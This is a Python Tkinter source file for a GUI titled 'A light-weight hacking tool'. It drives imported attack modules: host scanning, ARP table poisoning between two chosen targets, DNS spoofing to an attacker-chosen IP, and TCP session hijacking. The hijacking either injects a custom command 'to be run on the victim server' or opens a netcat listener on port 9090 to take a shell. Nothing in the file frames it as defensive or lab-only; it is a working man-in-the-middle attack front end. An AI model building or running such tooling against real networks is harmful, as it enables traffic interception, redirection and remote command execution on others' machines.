import tkinter as tk
import tkinter.ttk as ttk
from scapy.all import *
from scapy_functions import *
from tcp_hijack import *
from arp_poison import *
from dns_spoof import *
from multiprocessing import Process
import os

''' Global variables '''

interface = ""
curr_lbx_selected = ""
target_1 = ""
target_2 = ""
redirect_ip = ""
custom_hijack_cmd = ""
process_arp_poisoner = Process()
process_dns_poisoner = Process()
process_tcp_hijacker = Process()
process_new_terminal = Process()
arp_poisoned = False
dns_spoofed = False
tcp_hijacked = False
full_control = False


''' Functions '''

def scan_hosts():
    global interface
  
    if (interface == ""):
        message = "No interface selected!"
        tk.messagebox.showerror(title = "Hosts", message = message)
        return

    hosts = scan_hosts_scapy(interface)
    lbx_hosts.delete(0, tk.END)

    for i in range(len(hosts)):
        lbx_hosts.insert(i, hosts[i])

def cbbx_if_selected(event):
    global interface
    interface = cbbx_interfaces.get()
    message = "You selected the " + interface + " interface. Now you can scan for hosts."
    tabControl.select(tab_hosts)
    tk.messagebox.showinfo(title = "Interface", message = message)

def lbx_if_selected(event):
    global curr_lbx_selected
    curr_lbx_selected = lbx_hosts.get(lbx_hosts.curselection())

def add_target_1():
    global target_1

    if (curr_lbx_selected == ""):
        message = "No host selected!"
        tk.messagebox.showerror(title = "Hosts", message = message)
        return

    target_1 = curr_lbx_selected[2]
    lbl_target_1.config(text = target_1)
    message = target_1 + " successfully added as target 1!"
    tk.messagebox.showinfo(title = "Target selection", message = message)

def add_target_2():
    global target_2

    if (curr_lbx_selected == ""):
        message = "No host selected!"
        tk.messagebox.showerror(title = "Hosts", message = message)
        return
    
    target_2 = curr_lbx_selected[2]
    lbl_target_2.config(text = target_2)
    message = target_2 + " successfully added as target 2!"
    tk.messagebox.showinfo(title = "Target selection", message = message)

def arp_spoofing():
    global target_1, target_2

    if (target_1 == "" or target_2 == ""): #Check precondition
        message = "No targets have been selected!" #Create error messae
        tk.messagebox.showerror(title = "ARP poisoning", message = message) #Display error message
        return #Exit

    global process_arp_poisoner, arp_poisoned
    process_arp_poisoner = Process(target=poison_arp_tables, args=(target_1, target_2)) #Initialize process
    process_arp_poisoner.start() #Start process
    arp_poisoned = True #Set flag which signals the existance of this process
    lbl_status_arp.config(text = "Status: ARP tables poisoned!") #Change the status
    message = "ARP poisoning successful!" #Create info message
    tk.messagebox.showinfo(title = "ARP poisoning", message = message) #Display message

def arp_stop():
    global arp_poisoned, process_arp_poisoner

    if (arp_poisoned == False):
        message = "ARP tables are not poisoned yet!"
        tk.messagebox.showwarning(title = "ARP poisoning", message = message)
        return

    process_arp_poisoner.terminate()
    restore_arp_table(target_1, target_2)
    #restore_arp_table(target_2, target_1)
    arp_poisoned = False
    lbl_status_arp.config(text = "Status: Not poisoned")
    message = "ARP spoofing stopped and ARP tabels restored!"
    tk.messagebox.showinfo(title = "ARP poisoning", message = message)

def dns_spoofing():
    global arp_poisoned

    if (arp_poisoned == False):
        message = "You are not MITM!"
        tk.messagebox.showerror(title = "DNS spoofing", message = message)
        return

    if (redirect_ip == ""):
        message = "No redirect server has been inserted!"
        tk.messagebox.showerror(title = "DNS spoofing", message = message)
        return

    global process_dns_poisoner, dns_spoofed
    process_dns_poisoner = Process(target=dns_sniffer, args=(target_2, redirect_ip))
    process_dns_poisoner.start()
    dns_spoofed = True
    status = "Status: DNS packets spoofed to " + redirect_ip
    lbl_status_dns.config(text = status)
    message = "DNS spoofing successful!"
    tk.messagebox.showinfo(title = "DNS spoofing", message = message)

def dns_stop():
    global dns_spoofed, process_dns_poisoner

    if (dns_spoofed == False):
        message = "DNS packets are not spoofed yet!"
        tk.messagebox.showwarning(title = "DNS spoofing", message = message)
        return

    process_dns_poisoner.terminate()
    dns_spoofed = False
    lbl_status_dns.config(text = "Status: Not spoofed")
    message = "DNS spoofing stopped!"
    tk.messagebox.showinfo(title = "DNS spoofing", message = message)

def set_redirect_ip(event):
    global redirect_ip
    redirect_ip = ent_dns_redirect.get()
    message = redirect_ip + " successfully added as the redirect server!"
    tk.messagebox.showinfo(title = "False server", message = message)

def tcp_hijacking():
    global target_1, process_tcp_hijacker, process_new_terminal, custom_hijack_cmd, tcp_hijacked
    client = target_1

    if (client == ""):
        message = "The client target has not been selected!"
        tk.messagebox.showerror(title = "TCP hijack", message = message)
        return
    
    if (custom_hijack_cmd != ""):
        process_tcp_hijacker = Process(target = tcp_sniff, args = (client, custom_hijack_cmd))
    else:
        process_tcp_hijacker = Process(target = tcp_sniff, args = (client, ""))
        full_control = True
        process_new_terminal = Process(target = terminal_nc)
        process_new_terminal.start()

    process_tcp_hijacker.start()
    tcp_hijacked = True
    message = "TCP hijacking started"
    tk.messagebox.showinfo(title = "TCP hijack", message = message)

def set_tcp_cmd(event):
    global custom_hijack_cmd
    custom_hijack_cmd = ent_tcp_cmd.get()
    message = "Command successfully added!"
    tk.messagebox.showinfo(title = "Custom command added!", message = message)

def tcp_stop():
    global process_tcp_hijacker, process_new_terminal, tcp_hijacked
    
    if (tcp_hijacked == False):
        message = "TCP hijacking has not been started yet!"
        tk.messagebox.showwarning(title = "TCP hijack", message = message)
        return

    process_tcp_hijacker.terminate()

    if (full_control == True):
         process_new_terminal.terminate()

    os.system('sudo killall -9 "x-terminal-emulator -e nc -nlvp 9090"')
    message = "TCP hijacking stopped"
    tk.messagebox.showinfo(title = "TCP hijack", message = message)

def on_closing():
    try:
        process_arp_poisoner.terminate()
        process_dns_poisoner.terminate()
        window.destroy()
    except:
        try:
            process_arp_poisoner.terminate()
            window.destroy()
        except:
            try:
                process_dns_poisoner.terminate()
                window.destroy()
            except:
                window.destroy()
            
    
''' NOT USED '''
def clicked():
    text = txtf_interface.get()
    test.configure(text = "  Interface selected: " + txtf_interface.get())

''' GUI CREATION '''


''' Define window '''
window = tk.Tk()
window.title("A light-weight hacking tool")
window.geometry("700x500+400+150")


''' Create tabs '''
tabControl = ttk.Notebook(window)
tab_interface = tk.Frame(tabControl)
tab_hosts = tk.Frame(tabControl)
tab_targets = tk.Frame(tabControl)
tab_arp = tk.Frame(tabControl)
tab_dns = tk.Frame(tabControl)
tab_tcp = tk.Frame(tabControl)

tabControl.add(tab_interface, text = "Interface")
tabControl.add(tab_hosts, text = "Hosts")
tabControl.add(tab_targets, text = "Targets")
tabControl.add(tab_arp, text = "ARP poison")
tabControl.add(tab_dns, text = "DNS spoof")
tabControl.add(tab_tcp, text = "TCP hijack")
tabControl.pack(expand = 1, fill = "both")

''' Interface tab '''
fr_interface = tk.Frame(tab_interface)

lbl_interfaces = ttk.Label(fr_interface, text = "Select interface")
lbl_interfaces.grid(column = 0, row = 0)

cbbx_interfaces = ttk.Combobox(fr_interface, values = rtrv_interfaces())
cbbx_interfaces.grid(column = 0, row = 1)
cbbx_interfaces.bind("<<ComboboxSelected>>", cbbx_if_selected)

fr_interface.place(relx = .5, rely = .5, anchor = "c")


''' Hosts tab '''

fr_hosts = tk.Frame(tab_hosts)

lbl_hosts = ttk.Label(fr_hosts, text = "Scan for hosts")
lbl_hosts.grid(column = 0, row = 0)

btn_scan_hosts = ttk.Button(fr_hosts, text = "Scan", command = scan_hosts)
btn_scan_hosts.grid(column = 0, row = 1)

fr_hosts.place(relx = 0.5, rely = 0.1, anchor = "c")

lbx_hosts = tk.Listbox(tab_hosts, width = 50, height = 15)
lbx_hosts.place(relx = 0.5, rely = 0.5, anchor = "c")
lbx_hosts.bind("<<ListboxSelect>>", lbx_if_selected)


fr_target_btns = tk.Frame(tab_hosts)

btn_target_1 = ttk.Button(fr_target_btns, text = "Add to target 1", command = add_target_1)
btn_target_1.grid(column = 0, row = 0)

btn_target_2 = ttk.Button(fr_target_btns, text = "Add to target 2", command = add_target_2)
btn_target_2.grid(column = 2, row = 0)

fr_target_btns.place(relx = 0.5, rely = 0.9, anchor = "c")


''' Targets tab '''

fr_target_1 = tk.Frame(tab_targets)
fr_target_2 = tk.Frame(tab_targets)

lbl_targets_one = ttk.Label(fr_target_1, text = "Target 1")
lbl_targets_one.grid(column = 0, row = 0)

lbl_target_1 = ttk.Label(fr_target_1, text = target_1)
lbl_target_1.grid(column = 0, row = 1)

lbl_targets_two = ttk.Label(fr_target_2, text = "Target 2")
lbl_targets_two.grid(column = 0, row = 0)

lbl_target_2 = ttk.Label(fr_target_2, text = target_2)
lbl_target_2.grid(column = 0, row = 1)

fr_target_1.place(relx = 0.25, rely = 0.1, anchor = "c")
fr_target_2.place(relx = 0.7, rely = 0.1, anchor = "c")


''' ARP poison tab '''

fr_arp = tk.Frame(tab_arp)

lbl_status_arp = ttk.Label(fr_arp, text = "Status: Not poisoned", font=("Courier", 18))
lbl_status_arp.grid(column = 0, row = 0)

btn_arp_spoof = ttk.Button(fr_arp, text = "Start ARP table poisoning", command = arp_spoofing)
btn_arp_spoof.grid(column = 0, row = 1, pady = 10)

btn_arp_stop = ttk.Button(fr_arp, text = "Stop ARP poisoning", command = arp_stop)
btn_arp_stop.grid(column = 0, row = 2)

fr_arp.place(relx = 0.5, rely = 0.5, anchor = "c")



''' DNS spoof tab '''

fr_dns = tk.Frame(tab_dns)

lbl_status_dns = ttk.Label(fr_dns, text = "Status: Not spoofed", font=("Courier", 18))
lbl_status_dns.grid(column = 0, row = 0, pady = 10)

lbl_redirect_ip = ttk.Label(fr_dns, text = "Insert redirect IP and press Enter: ")
lbl_redirect_ip.grid(column = 0, row = 1)

ent_dns_redirect = ttk.Entry(fr_dns)
ent_dns_redirect.bind("<Return>", set_redirect_ip)
ent_dns_redirect.grid(column = 0, row = 2)

btn_dns_spoof = ttk.Button(fr_dns, text = "Start DNS spoofing", command = dns_spoofing)
btn_dns_spoof.grid(column = 0, row = 3, pady = 10)

btn_dns_stop = ttk.Button(fr_dns, text = "Stop DNS spoofing", command = dns_stop)
btn_dns_stop.grid(column = 0, row = 4)

fr_dns.place(relx = 0.5, rely = 0.5, anchor = "c")



''' TCP hijack tab '''

fr_tcp = tk.Frame(tab_tcp)

lbl_status_tcp = ttk.Label(fr_tcp, text = "Status: Not hijacked", font=("Courier", 18))
lbl_status_tcp.grid(column = 0, row = 0, pady = 10)

lbl_select_targets = ttk.Label(fr_tcp, text = "Select target 1 as the target client!")
lbl_select_targets.grid(column = 0, row = 1)

btn_tcp_hijack = ttk.Button(fr_tcp, text = "Start TCP hijacking", command = tcp_hijacking)
btn_tcp_hijack.grid(column = 0, row = 2, pady = 10)

btn_tcp_hijack = ttk.Button(fr_tcp, text = "Stop TCP hijacking", command = tcp_stop)
btn_tcp_hijack.grid(column = 0, row = 3)

lbl_insert_cmd = ttk.Label(fr_tcp, text = "(Optional) Insert a custom command to be run on the victim server and press Enter: ")
lbl_insert_cmd.grid(column = 0, row = 4, pady = 10)

ent_tcp_cmd = ttk.Entry(fr_tcp)
ent_tcp_cmd.bind("<Return>", set_tcp_cmd)
ent_tcp_cmd.grid(column = 0, row = 5)

fr_tcp.place(relx = 0.5, rely = 0.5, anchor = "c")




window.protocol("WM_DELETE_WINDOW", on_closing)

window.mainloop()